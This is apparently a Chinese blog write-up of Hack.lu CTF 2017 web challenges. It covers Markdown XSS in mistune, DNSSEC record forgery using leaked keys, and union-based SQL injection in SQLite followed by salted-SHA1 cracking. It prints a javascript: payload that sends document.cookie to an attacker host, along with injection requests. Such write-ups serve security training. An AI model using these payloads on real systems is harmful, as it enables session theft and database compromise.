---
title:  HACK.LU CTF 2017 Web  Write-up
subtitle: XSS
time: 2017.10.19 10:00:00
layout: post
catalog: true
tags:
- CTF
- Web
excerpt: Hack.lu CTF Web题解，共勉。

---

# HACK.LU CTF 2017 WP



## Mistune

![Markdownxss](/Users/moxiaoxi/Desktop/Markdownxss.png)

这是一道Markdown的XSS题，题目中有一个测试页面用来测试具体输入输出，与此同时admin页面存在提示:

```html
We use mistune.Renderer(escape=True, hard_wrap=True)
The admin will look at your converted Markdown.
The admin will click on links (<a>).
You can check the queue here
```

所以，思路很明确，就是绕过markdown进行xss。

为了方便fuzz，写了一个本地脚本，模仿过滤。

```python
import mistune

renderer = mistune.Renderer(escape=True, hard_wrap=True)
# use this renderer instance
markdown = mistune.Markdown(renderer=renderer)
while True:
    text = raw_input('test Markdown XSS:\n')
    print markdown(text)
```
测试结果如下：

```Html
<> & 会被转义
'"在markdown语法中会被转义
javascript被禁
右括号有影响,一个右括号就当作闭合
text=[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))&test=Test+in+Browser
=>>
 <p><p><a href="j    a   v   a   s   c   r   i   p   t:prompt(document.cookie">a</a>1)2)</p>
</p>


点击base64可以xss
text=[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\&test=Test+in+Browser


测试：
[a](data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cHM6Ly94LnNlY2JveC5jbi9iVzhEblE%2bPC9zY3JpcHQ%2b)


```

一开始fuzz出了data的payload，但是DATA协议是无法获取cookie信息的，所以无法获得admind的cookie信息。

后面，测出如下payload：

```html
![a](javascript:prompt(document.cookie))\
<javascript:window.open('http://vps/?id='+document.cookie)>'
=>
<p><a href="javascript:window.open('http://vps:7890/?id='+document.cookie)">javascript:window.open('http://vps:7890/?id='+document.cookie)</a>'</p>
```

绕过，获得cookie。

![markdownxss_flag](/Users/moxiaoxi/Desktop/markdownxss_flag.png)



## DnSoSecure

查看网页源码，有一个源码泄漏点。

```Html
<!-- <a href="/static/source.zip">Source</a> -->
```

下载下来，获得一个git库，通过回退版本，可以得到DNSSEC的KSK和ZSK。

```bash
.
├── __init__.py
├── forms.py
├── keys
│   ├── Ksecret+007+11537.key
│   ├── Ksecret+007+11537.private
│   ├── Ksecret+007+26883.key
│   └── Ksecret+007+26883.private
├── keys.zip
├── static
│   ├── css
│   │   ├── custom.css
│   │   ├── normalize.css
│   │   ├── skeleton.css
│   │   └── test.css
│   └── img
│       └── background.jpg
├── templates
│   ├── base.html
│   └── index.html
├── utils.py
└── views.py
```

主要逻辑是服务器会向我们指定的IP查询otherside.earth.flux.的A记录。该记录必须符合DNSSEC规范。我们只需要伪造一个合法的A记录即可，使其解析该域名到我们的服务器上。伪造成功后，其会向我们伪造的IP发送一个hello包。在我们回复一个数据后，其会回显flag。感觉主要考察DNSSEC服务器的搭建能力= =。

具体分析如下：

```python

def correct_dnssec(nsaddr, domain):
    #
    name = dns.name.from_text(domain)
    key = {
        name: dns.rrset.from_text(
            domain, 3600, 'IN', 'DNSKEY',
            '256 3 7 AwEAAeJd3Xyd8l3rWDx46UwPMyLOSVcbuwDgEvt2iEWTAghVbpw5M2YN 0GxUqa6vWI/RAhSynF4fxSvp1z3PnKBFle/Qxz7MzfPgH0spzriWsP8k qjs0Y9/xJU0tzZJ2TrIypdmEqpKtMbs3gRrrADz8pr/AdI7bjvX4r6Oh ty04lG8zyj1wwuWXi/oVfk1rTD9I2aq7SWK9REnueUFRsshMLQK5Vgpo Row0HmrE7Peg59lFFSi54rSJivb/4Tb0P8AtIlIUW0ZZOR9E/MsswWFZ Qw56A0Z5LJK4t8RmV5+vAhflNn/uTSEOpC08vUqkNQbOBXr1Ie/t57H6 ywvsKwEYo9s=',
            '257 3 7 AwEAAdth+HteT0kUim5+hOkyTpMU1FbNfxjn7otvpcA0ZSb/37Tr+WRJ l1nmzHkmrW+gJuzj5M+1QPEv41CujWe8EdGOyA3jM2KENj7NMdiNjh1G puzQa7YFxR4z5SG8+M5zvO5F3CTFWU5tZCTzkvk4Zbs5aJ3RZ6Zk1EBK xwoKz1CGCoedBM1VcKwJ2H+NT15m1cb/AfsSEljTyvruUUiJo84+MRPh luYtPrVKIwnHe6qxvhLSvpG0HFNNkBudy/TOf7C51zmdkpW+3hvbzp/I 79LEuXyYwXft4vpxKNv4zTGOoXNrBAxHcfmvAJsplIzSGcM84yRD+oWm Pu/WF+ESuPv9bmws0hZ2L2+dLpKZjDjb8ppxFS/zJFfWqqErRWssQo64 4lET6m2qET1g22YeB5iLAhVfAmTMZtxnhLqSHJ1EdQIwKm3RJfUsr+z+ Wxb9BZS/P2OSUsSzLOQ7hWjViCE45JMW0gGnMrvSeloAePtvYasfBjaT IDhW2knhKVr2ZoJ6I7pvZBrc/hLB2NGiFaN2otLwIX6InRTT8zrndDY8 uXwVsrBH/4UXy0CIf0PNwjqyFTALSx2DYGW1aU9y0wiZbX5h3msJGRO3 eiHP6QNv+bQJ3f1isMuaAFXT07gcfrAVYT72clU5Nep1Dp6hBfmkfnGT jhiPj16+cfJerrIP'
        )
    }
    request = dns.message.make_query(domain, dns.rdatatype.A, want_dnssec=True)
    try:
        request = dns.query.udp(request, nsaddr, timeout=7)
    except:
        return False
    answer = request.answer
    if len(answer) < 2:
        # dnsserc not supported
        return False
    else:
        try:
            dns.dnssec.validate(answer[0], answer[1], key)
            return str(answer[0].to_rdataset()[0])
        except:
            # dnssec failed
            return False
```

它会向一个我们指定IP的服务器发送DNSSEC查询包，查询otherside.earth.flux.的A记录。（可通过抓包或看KSK、ZSK得出）

接下来，就只需要伪造一个合法的DNSSEC回复包即可。

构建的bind的zone包如下：

```
$TTL 1D
@	IN SOA	@ root.otherside.earth.flux. (
					0	; serial
					1D	; refresh
					1H	; retry
					1W	; expire
					3H )	; minimum
	NS	@
	A	      202.112.51.70
www     A             202.112.51.70
$INCLUDE Kotherside.earth.flux.+007+11537.key
$INCLUDE Kotherside.earth.flux.+007+26883.key
```

202.112.51.70是我们的服务器ip。

利用`dnssec-signzone -o otherside.earth.flux -t otherside.earth.flux.zone`对其签名.

```
 named cat otherside.earth.flux.zone.signed
; File written on Thu Oct 19 05:02:47 2017
; dnssec_signzone version 9.9.4-RedHat-9.9.4-51.el7
otherside.earth.flux.	86400	IN SOA	otherside.earth.flux. root.otherside.earth.flux. (
					0          ; serial
					86400      ; refresh (1 day)
					3600       ; retry (1 hour)
					604800     ; expire (1 week)
					10800      ; minimum (3 hours)
					)
			86400	RRSIG	SOA 7 3 86400 (
					20171118080247 20171019080247 11537 otherside.earth.flux.
					ufab/dHRzjiCe3ZVunh9KnXmGSPqlps3D5CP
					lQEtkANdIZ5GZm3QIXk137Q4uStE6GIE3hJf
					hEaX+vycC9bf7pVys6HvrMPNo+7aBk3EhmOg
					yG1AlRZQvTd6OBvSyfVUjkMH+ty96IUI46/V
					/jLoeThaBJKRvOoh4HLoac8r5Mi9bvRP7pLj
					JkdGWpufrDZYO+kVVVHA7cMulDJSxErv8n7Y
					AKof0H9aRHUm6xwp4GU3TON5oh/PXApNBSCm
					8tMnWCe9I90JlWh41QO/iIX7nA7vAjM9KEPf
					ELUXFxL2F+MYKARj3yGlX+8Rsg6s7/jddl8R
					y+e9EUJXsw2+iO9P4Q== )
			86400	NS	otherside.earth.flux.
			86400	RRSIG	NS 7 3 86400 (
					20171118080247 20171019080247 11537 otherside.earth.flux.
					s6cdjYj4rwIIgdbTCNf3K65s1NQmqS0AV2Vm
					4oEz1IVDO6ENr44DgUadX6E/SzMXu3Y1/3iM
					qCexpEHk2Xq33Cbtx2dgQDVRvRXS14mmsvHc
					NJTmgkRn056H/zlvhJLW/pDJwZVWdqYdwWUW
					dLtE9TZXfKOy/szschBrZZVeuHEzfsX9zC7k
					JxOrJRUS3/KGdDLH38YkrIcqUy1vt8MidzkF
					epZGZfE39smm4PD16BlDYQR4AO0P6r0Dj3af
					QdWS1vdBItQwYSQ2PXmYzEUQrSBjO0a5KtxS
					3cnL2gS4dEDFQbBb1p+8y0H7r/6Gyw1RQwPc
					CjUaFw6d5hck+TI0+A== )
....
```

修改配置文件，重新载入zone。

```
zone "otherside.earth.flux" IN {
	type master;
	file "otherside.earth.flux.zone.signed";
};
```

至此，我们就可以伪造otherside.earth.flux的DNSSEC A记录包。

```python
@app.route('/', methods=['GET', 'POST'])
def index():
    form = DNSServer()
    if form.validate_on_submit():
        ip = correct_dnssec(form.dnsip.data, app.config['DOMAIN'])
        if ip:
            if check_ipv4(ip):
                send_secret(ip, app.config['FLAG'], app.config['PORT'])
            flash('Sending data ... ', 'success')
        else:
            flash('Error!', 'error')
    return render_template('index.html', form=form)
```

IP验证成功后，其会向1337端口发送数据。（端口可由抓包获得。这里必须回复一个数据，才能获得flag。）

```python
def send_secret(host, message, port):
    try:
        s = socket.create_connection((host, port), timeout=10)
        s.send('Server Hello.\n'.encode())
        s.recv(1)
        s.send((message + '\n').encode())
        s.close()
    except:
        pass
```

然后，用netcat监听，回复一个数据包，就能得到flag。

```bash
➜  named nc -w 1 -k -lvv -p 1337
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 149.13.33.84.
Ncat: Connection from 149.13.33.84:51758.
Server Hello.
1
flag{bb5986219c9811aa66e7ebeb05d7f757}
NCAT DEBUG: Closing connection.

```







## Flatscience

令debug=1,能窃取到源码。

```php
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">

<html>
<head>
<style>
blockquote { background: #eeeeee; }
h1 { border-bottom: solid black 2px; }
h2 { border-bottom: solid black 1px; }
.comment { color: darkgreen; }
</style>

<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<title>Login</title>
</head>
<body>


<div align=right class=lastmod>
Last Modified: Fri Mar  31:33:7 UTC 1337
</div>

<h1>Login</h1>

Login Page, do not try to hax here plox!<br>


<form method="post">
  ID:<br>
  <input type="text" name="usr">
  <br>
  Password:<br> 
  <input type="text" name="pw">
  <br><br>
  <input type="submit" value="Submit">
</form>

<?php
if(isset($_POST['usr']) && isset($_POST['pw'])){
        $user = $_POST['usr'];
        $pass = $_POST['pw'];

        $db = new SQLite3('../fancy.db');

        $res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");
    if($res){
        $row = $res->fetchArray();
    }
    else{
        echo "<br>Some Error occourred!";
    }

        if(isset($row['id'])){
                setcookie('name',' '.$row['name'], time() + 60, '/');
                header("Location: /");
                die();
        }

}

if(isset($_GET['debug']))
highlight_file('login.php');
?>
<!-- TODO: Remove ?debug-Parameter! -->


<hr noshade>
<address>Flux Horst (Flux dot Horst at rub dot flux)</address>
</body>
```

这里存在一个典型的sql盲注。payload：usr=admin%27--+&pw=123 此时，会无debug信息。

而这里有一个技巧（仅针对题目，正常环境中应该不会出现。）服务器回复包中，有一个Set-Cookie操作，里面带了sql查询到的数据。那么我们可以利用其回显数据，把盲注打成union查询注入。

payload如下：

```
POST /login.php?debug=1 HTTP/1.1
Host: flatscience.flatearth.fluxfingers.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

usr=111' union (select 1,id from Users )--+&pw=flux

```

那么，我们就可以依次回显获得数据。接下来，我们可以利用sqlite3的特性，获得数据。

```
usr=111' union select 1,name FROM sqlite_master WHERE type='table' limit 0,1 --+&pw=flux

获得表信息，得到信息：只有一个表 Users

获得所有表结构：
usr=111' union select 1,sql FROM sqlite_master WHERE type='table' limit 0,1 --+&pw=flux

表结构如下：
 CREATE TABLE Users(
id int primary key,
name varchar(255),
password varchar(255),
hint varchar(255)
)
```

最终，表内容如下：

| id   | Name   | password                                 | hint                        |
| ---- | ------ | ---------------------------------------- | --------------------------- |
| 1    | admin  | 3fab54a50e770d830c0416df817567662a9dc85c | my+fav+word+in+my+fav+paper |
| 2    | fritze | 54eae8935c90f467427f05e4ece82cf569f89507 | my+love+is…?                |
| 3    | hansi  | 34b0bb7c304949f9ff2fc101eef0f048be10d3bd | the+password+is+password    |

会发现cmd5能够解开2，3的sha1，而1的sha1无法解开。利用hint，对网站上所有的paper进行分析。导入paper中的所有单词，进行哈希爆破。

```python
def test(s):
	salt = 'Salz!'
	a = s+salt
	sha = hashlib.sha1(a).hexdigest()
	# print sha
	flag = '3fab54a50e770d830c0416df817567662a9dc85c'
	# print flag
	if flag==sha:
		print s
		return  True
	else:
		return False
```

获得密码，**ThinJerboa**

登录，得到flag

![flatscience](/Users/moxiaoxi/Desktop/flatscience.png)



## Triangle 

一个Web逆向题，没看。学长说是，Unicorn.js模拟的arm binary。





## 总结：

以前一直听说hacklu的CTF题目质量很高，但参加这次下来，感觉Web题目一般，没什么特别新的思路，还加了一些杂项的技巧，不知道其他类型的题目怎么样。